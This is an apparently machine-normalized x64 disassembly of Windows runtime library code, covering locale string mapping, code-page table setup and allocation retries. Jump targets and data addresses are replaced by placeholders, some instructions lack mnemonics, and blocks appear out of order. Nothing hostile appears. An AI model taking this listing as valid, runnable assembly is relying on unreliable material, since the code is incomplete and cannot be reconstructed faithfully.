lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r14d [ rbp ]
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
mov ecx r14d
mov r9d r13d
mov r8 rdi
mov edx r15d
call [ LCMapStringW@IAT ]
movsxd rsi eax
test eax eax
je r-xdata
call sub_1800213d4
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax esi
call sub_18002094c
mov r8d 0x400
test r8d r15d
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18002b220
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax r8
test eax eax
jle r-xdata
mov ecx [ rbp + 0x70 ]
test ecx ecx
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi ecx
jg r-xdata
add rdi 0x10
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r8
ja r-xdata
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x28 ] ecx
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x70 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
test eax eax
jne r-xdata
call sub_1800213d4
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_18002094c
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18002b220
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_18002252c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_1800221bc
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_180022260
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800225c4
sub rsp 0x28
call sub_180025c90
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov rax [ rcx + 0x140 ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_180026bfc
mov rcx rax
sub_180022600
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_1800221bc
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x1
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x1
lea r8 [ rsp + 0x20 ]
mov edx 0x1
mov ecx ebx
call sub_18002b270
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_180022680
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_1800221bc
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x2
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x2
lea r8 [ rsp + 0x20 ]
mov edx 0x2
mov ecx ebx
call sub_18002b270
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_180022700
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_1800221bc
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x4
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x4
lea r8 [ rsp + 0x20 ]
mov edx 0x4
mov ecx ebx
call sub_18002b270
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_180022780
mov r11 rsp
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
xor ebx ebx
mov rdi rcx
mov [ r11 - 0x58 ] rcx
mov [ rsp + 0x58 ] rbx
mov r13d ebx
mov r15d ebx
mov r14d ebx
mov r12d ebx
mov [ r11 - 0x50 ] rbx
cmp [ rcx + 0x14 ] ebx
je r-xdata
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
lea rbp [ rcx + 0x4 ]
lea esi [ rbx + 0x1 ]
cmp [ rbp ] ebx
jne r-xdata
lea rax [ r--data ]
mov esi 0x1
mov [ rcx + 0x130 ] rbx
mov [ rcx + 0x140 ] rax
lea rax [ r--data ]
mov [ rcx + 0x138 ] rbx
mov [ rcx + 0x148 ] rax
lea rax [ r--data ]
mov [ rcx + 0x10c ] esi
mov [ rcx + 0x150 ] rax
xor eax eax
[ rax ]
mov ecx 0x4
call sub_180022c10
mov r12d 0x180
mov edx 0x2
mov ecx r12d
mov [ rsp + 0x58 ] rax
call sub_180022c90
mov rdx rsi
mov ecx r12d
mov r13 rax
call sub_180022c90
mov rdx rsi
mov ecx r12d
mov r15 rax
call sub_180022c90
lea ecx [ r12 - 0x7f ]
mov rdx rsi
mov r14 rax
call sub_180022c90
mov r12 rax
mov rax [ rsp + 0x58 ]
test rax rax
je r-xdata
movzx r8d [ rcx + 0x30 ]
lea rcx [ r11 - 0x58 ]
xor edx edx
mov r9d 0x1004
mov [ rsp + 0x20 ] rbp
call sub_180025790
test eax eax
jne r-xdata
mov rcx [ rsp + 0x58 ]
call sub_18002094c
mov rcx r13
call sub_18002094c
mov rcx r15
call sub_18002094c
mov rcx r14
call sub_18002094c
mov ebx esi
test r13 r13
je r-xdata
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
test r12 r12
je r-xdata
test r15 r15
je r-xdata
test r14 r14
je r-xdata
mov [ rax ] ebx
mov rcx r12
mov eax ebx
mov [ rcx ] al
add eax esi
add rcx rsi
cmp eax 0x100
jl r-xdata
mov ecx [ rbp ]
lea rdx [ rsp + 0x70 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x70 ] 0x5
ja r-xdata
movzx eax [ rsp + 0x70 ]
mov [ rsp + 0x50 ] eax
cmp eax esi
jle r-xdata
mov eax [ rbp ]
mov [ rsp + 0x38 ] ebx
lea rcx [ r13 + 0x100 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rcx
xor ecx ecx
mov r9d 0x100
mov r8 r12
mov edx esi
call sub_18002b4b8
test eax eax
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r15 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r8d [ rax + 0x1 ]
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov [ rsp + 0x20 ] eax
call sub_18002252c
test eax eax
je r-xdata
lea rcx [ rsp + 0x77 ]
mov eax [ rbp ]
mov edx [ rdi + 0x14 ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
mov eax 0xff
lea rcx [ r14 + 0x81 ]
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rcx
lea r9 [ r12 + 0x1 ]
xor ecx ecx
mov r8d 0x200
mov [ rsp + 0x20 ] eax
call sub_18002252c
test eax eax
je r-xdata
movzx edx [ rcx - 0x1 ]
jmp r-xdata
lea rbp [ r13 + 0xfe ]
mov [ rbp ] bx
mov [ r15 + 0x7f ] bl
mov [ r14 + 0x7f ] bl
mov [ r15 + 0x80 ] bl
mov [ r14 + 0x80 ] bl
cmp [ rsp + 0x50 ] esi
jle r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
lea rdx [ r13 + 0x200 ]
mov r8d 0xfe
mov rcx r13
call sub_1800205e0
lea rdx [ r15 + 0x100 ]
mov r8d 0x7f
mov rcx r15
call sub_1800205e0
lea rdx [ r14 + 0x100 ]
mov r8d 0x7f
mov rcx r14
call sub_1800205e0
mov rcx [ rdi + 0x130 ]
test rcx rcx
je r-xdata
cmp [ rsp + 0x76 ] bl
je r-xdata
movsxd rax edx
add edx esi
mov [ rax + r12 ] 0x20
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
mov rax [ rsp + 0x58 ]
mov [ rax ] esi
mov [ rdi + 0x130 ] rax
lea rax [ r13 + 0x100 ]
mov [ rdi + 0x140 ] rax
lea rax [ r15 + 0x80 ]
mov [ rdi + 0x138 ] rbp
mov [ rdi + 0x148 ] rax
lea rax [ r14 + 0x80 ]
mov [ rdi + 0x150 ] rax
mov eax [ rsp + 0x50 ]
mov [ rdi + 0x10c ] eax
jmp r-xdata
[ rcx ]
jne r-xdata
lea rcx [ rsp + 0x77 ]
cmp [ rcx ] bl
je r-xdata
mov rcx r12
call sub_18002094c
mov eax ebx
jmp r-xdata
mov rcx [ rdi + 0x138 ]
sub rcx 0xfe
call sub_18002094c
mov rcx [ rdi + 0x148 ]
add rcx 0xffffffffffffff80
call sub_18002094c
mov rcx [ rdi + 0x150 ]
add rcx 0xffffffffffffff80
call sub_18002094c
mov rcx [ rdi + 0x130 ]
call sub_18002094c
movzx edx [ rcx - 0x1 ]
jmp r-xdata
movzx eax [ rcx ]
cmp edx eax
jle r-xdata
movsxd rax edx
mov r8d 0x8000
add edx esi
mov [ r13 + rax * 2 + 0x100 ] r8w
add rcx 0x2
cmp [ rcx - 0x1 ] bl
jne r-xdata
cmp [ rcx ] bl
je r-xdata
sub_180022ba0
sub rsp 0x28
call sub_180025c90
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov eax [ rcx + 0x4 ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_180026bfc
mov rcx rax
sub_180022bd8
sub rsp 0x28
call sub_180025c90
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
lea rax [ rcx + 0xc ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_180026bfc
mov rcx rax
sub_180022c10
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi [ rw-data ]
xor ebp ebp
mov rsi rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test edi edi
je r-xdata
mov ecx ebp
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea r11d [ rbp + 0x3e8 ]
cmp r11d edi
mov ebp r11d
cmova ebp r12d
cmp ebp r12d
jne r-xdata
mov rcx rsi
call sub_1800213d4
mov rbx rax
test rax rax
jne r-xdata
sub_180022c90
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_1800262a0
mov rbx rax
test rax rax
jne r-xdata
sub_180022d14
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_18002b538
mov rbx rax
test rax rax
jne r-xdata
sub_180022d9c
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_180022e24
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180025c0c
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_180022d9c
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_180025c0c
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_180022e6c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0xd
call sub_18002d0a8
nop
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov ecx 0xd
call sub_18002cfa8
cmp [ rbx ] 0x0
je r-xdata
[ rcx ]
jne r-xdata
mov eax 0xbaadf00d
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov rcx rbx
call sub_18002094c
add rsp 0x20
pop rbx
mov ecx 0xc
call sub_18002d0a8
nop
mov rcx [ rbx ]
call sub_180026984
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
mov ecx 0xc
call sub_18002cfa8
cmp [ rcx ] 0x0
jne r-xdata
call sub_18002094c
nop
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
call sub_180026a28
nop
sub_180022f14
test r8d r8d
jle r-xdata
retn
mov [ rsp + 0x18 ] r8d
mov [ rsp + 0x20 ] r9
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
lea rdi [ rsp + 0x78 ]
xor ebx ebx
mov rsi rdx
add rdi 0xfffffffffffffff8
mov rbp rcx
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
inc ebx
cmp ebx [ rsp + 0x70 ]
jl r-xdata
add rdi 0x8
mov rdx rsi
mov rcx rbp
mov r8 [ rdi ]
call sub_18002d0ec
test eax eax
jne r-xdata
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
sub_180022f7c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov rbx rdx
mov r8d 0x90
xor edx edx
mov rsi rcx
call sub_180021150
cmp [ rbx ] 0x0
jne r-xdata
cmp [ rbx ] 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
xor ebp ebp
lea r8 [ rbx + 0x1 ]
cmp [ r8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
or eax 0xffffffff
lea r12 [ rax + rbx ]
mov dil [ r12 ]
test ebp ebp
jne r-xdata
mov edx 0x10
lea rcx [ rsi + 0x80 ]
lea r9d [ rdx - 0x1 ]
call sub_18002d168
test eax eax
jne r-xdata
cmp ebp 0x1
jne r-xdata
cmp rax 0x40
jae r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
mov [ rsi + 0x8f ] al
jmp r-xdata
cmp ebp 0x2
jne r-xdata
cmp rax 0x40
jae r-xdata
cmp dil 0x2e
je r-xdata
cmp rax 0x10
jae r-xdata
cmp dil 0x5f
je r-xdata
lea edx [ rbp + 0x40 ]
mov r9 rax
mov r8 rbx
mov rcx rsi
call sub_18002d168
test eax eax
je r-xdata
test dil dil
je r-xdata
lea rcx [ rsi + 0x40 ]
lea edx [ rbp + 0x3f ]
mov r9 rax
mov r8 rbx
call sub_18002d168
test eax eax
je r-xdata
cmp dil 0x2c
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
lea rcx [ rsi + 0x80 ]
mov r9 rax
mov r8 rbx
mov edx 0x10
call sub_18002d168
test eax eax
jne r-xdata
cmp dil 0x2c
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
test dil dil
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
lea rbx [ r12 + 0x1 ]
inc ebp
jmp r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18002163c
test rax rax
je r-xdata
sub_18002312c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx r8
mov rdi rdx
mov rsi rcx
call sub_180025324
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
lea rax [ rbx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
lea rax [ rbx + 0x80 ]
cmp [ rax ] 0x0
je r-xdata
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_180022f14
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
lea r9 [ r--data ]
mov r8d 0x2
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] rax
call sub_180022f14
sub_1800231c4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rdi rcx
mov ecx 0x355
mov r12d 0x1
call sub_180022c10
xor r15d r15d
mov rsi rax
test rax rax
jne r-xdata
lea rbp [ rax + 0x4 ]
mov ebx 0x351
mov r8d 0x3
mov [ rbp ] r15b
mov [ rax ] r12d
mov rax [ rdi + 0x68 ]
mov r9 [ r--data ]
mov [ rsp + 0x28 ] rax
lea rax [ r--data ]
mov edx ebx
mov rcx rbp
mov [ rsp + 0x20 ] rax
call sub_180022f14
lea r13 [ r--data ]
lea r14 [ rdi + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r15
call sub_180026490
int3
mov rcx [ r14 ]
lea rbx [ r14 + 0x20 ]
mov rdx [ rbx ]
call sub_180025410
mov r14 rbx
mov r8d 0x3
test eax eax
mov rax [ rbx ]
mov ebx 0x351
mov [ rsp + 0x28 ] rax
cmovne r12d r15d
lea rax [ r--data ]
add r13 0x18
mov edx ebx
mov rcx rbp
mov r9 [ r13 ]
mov [ rsp + 0x20 ] rax
call sub_180022f14
lea r11 [ r--data ]
cmp r13 r11
jl r-xdata
lea r8 [ r--data ]
mov rdx rbx
mov rcx rbp
call sub_18002d0ec
test eax eax
jne r-xdata
test r12d r12d
jne r-xdata
mov rcx rsi
call sub_18002094c
mov rcx [ rdi + 0x58 ]
or ebx 0xffffffff
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x58 ]
or ebx 0xffffffff
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x60 ]
test rcx rcx
je r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rax [ rdi + 0x60 ]
test rax rax
je r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rax [ rdi + 0x88 ]
mov [ rdi + 0x60 ] r15
mov [ rdi + 0x50 ] r15
mov [ rdi + 0x58 ] r15
mov [ rdi + 0x48 ] r15
jmp r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rcx [ rdi + 0x58 ]
call sub_18002094c
mov [ rdi + 0x60 ] r15
mov [ rdi + 0x50 ] r15
mov [ rdi + 0x58 ] rsi
mov [ rdi + 0x48 ] rbp
mov rax rbp
jmp r-xdata
mov ecx ebx
[ rax ] ecx
add ecx ebx
jne r-xdata
mov rcx [ rdi + 0x58 ]
call sub_18002094c
mov rcx [ rdi + 0x60 ]
call sub_18002094c
mov rcx [ rdi + 0x60 ]
call sub_18002094c
sub_1800233a0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rsi [ rsp + 0x160 ]
mov rbx r9
mov r14 r8
mov rbp rdx
mov rdi rcx
call sub_180025c90
lea rcx [ rax + 0x170 ]
lea r15 [ rax + 0x168 ]
xor r12d r12d
mov [ rsp + 0x40 ] rcx
lea rcx [ rax + 0x174 ]
lea r13 [ rax + 0x1f7 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x38 ] rcx
test rdi rdi
je r-xdata
xor eax eax
test rbp rbp
je r-xdata
test r14 r14
je r-xdata
cmp [ rdi ] 0x43
jne r-xdata
mov rcx rdi
call sub_180023ce0
mov r12 rax
cmp rax 0x83
jae r-xdata
cmp [ rdi + 0x1 ] r12b
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov rdx rdi
xor r15d r15d
call sub_180022f7c
test eax eax
jne r-xdata
mov rdx rdi
mov rcx r13
call sub_180025410
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r14
mov rcx rbp
call sub_180025324
test eax eax
jne r-xdata
mov rdx [ rsp + 0x30 ]
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x50 ]
call sub_18002d978
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov rcx [ rsp + 0x38 ]
mov rdx rdi
call sub_180025410
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_180026490
int3
test rbx rbx
je r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x40 ]
lea r8 [ rsp + 0x50 ]
movzx eax [ rax + 0x4 ]
mov edx 0x83
mov [ rcx ] eax
mov rcx r13
call sub_18002312c
cmp [ rdi ] r15b
je r-xdata
test rsi rsi
je r-xdata
mov r8d 0x6
mov rdx r15
mov rcx rbx
call sub_1800205e0
test rsi rsi
je r-xdata
mov [ rbx ] r12d
mov [ rbx + 0x4 ] r12w
lea rdi [ r--data ]
cmp r12 0x83
jae r-xdata
mov r8 r13
mov rdx r14
mov rcx rbp
call sub_180025324
test eax eax
jne r-xdata
mov rdx [ rsp + 0x40 ]
mov r8d 0x4
mov rcx rsi
call sub_1800205e0
mov rax rbp
jmp r-xdata
mov [ rsi ] r12d
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
mov r15 [ rsp + 0x30 ]
mov r15 r12
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
mov rax r13
jmp r-xdata
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xf8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rsp + 0x38 ]
lea r9 [ r15 + 0x1 ]
mov r8 rdi
mov edx 0x83
call sub_18002d168
test eax eax
jne r-xdata
sub_1800235dc
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x110 ]
sub rsp 0x210
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x100 ] rax
mov rbx r8
movsxd r12 edx
mov rdi rcx
call sub_180025c90
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x70 ]
mov rsi rax
lea rax [ rsp + 0x44 ]
mov r8d 0x83
mov rcx rbx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rax
call sub_1800233a0
test rax rax
jne r-xdata
mov rbx r12
lea rcx [ rsp + 0x70 ]
mov r15 r12
shl rbx 0x5
mov rdx [ rbx + rdi + 0x48 ]
call sub_180025410
test eax eax
jne r-xdata
xor eax eax
lea rcx [ rsp + 0x70 ]
call sub_180023ce0
mov r12 rax
lea rcx [ rax + 0x5 ]
call sub_180022c10
mov r13 rax
test rax rax
je r-xdata
mov rax [ rbx + rdi + 0x48 ]
jmp r-xdata
mov rax [ rbx + rdi + 0x48 ]
lea r14 [ r15 + 0x3 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x58 ] rax
mov eax [ rdi + r14 * 4 ]
mov r8d 0x6
mov [ rsp + 0x54 ] eax
lea rax [ r15 + r15 * 2 + 0x12 ]
lea rax [ rdi + rax * 2 ]
mov rdx rax
mov [ rsp + 0x60 ] rax
call sub_1800205e0
mov eax [ rdi + 0x4 ]
lea rdx [ r12 + 0x1 ]
lea r8 [ rsp + 0x70 ]
lea rcx [ r13 + 0x4 ]
mov [ rsp + 0x50 ] eax
call sub_180025324
test eax eax
jne r-xdata
mov rcx [ rbp + 0x100 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x268 ]
add rsp 0x210
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
mov rcx [ rsp + 0x60 ]
lea rax [ r13 + 0x4 ]
lea rdx [ rsp + 0x48 ]
mov [ rbx + rdi + 0x48 ] rax
movzx eax [ rsp + 0x48 ]
mov r8d 0x6
mov [ rdi + r14 * 4 ] eax
call sub_1800205e0
mov r9d r15d
cmp r15d 0x2
jne r-xdata
cmp r9d 0x1
jne r-xdata
mov eax [ rsp + 0x44 ]
xor r8d r8d
xor edx edx
mov [ rdi + 0x4 ] eax
mov rcx [ rsi + 0x29c ]
lea rax [ r15 + r15 * 2 ]
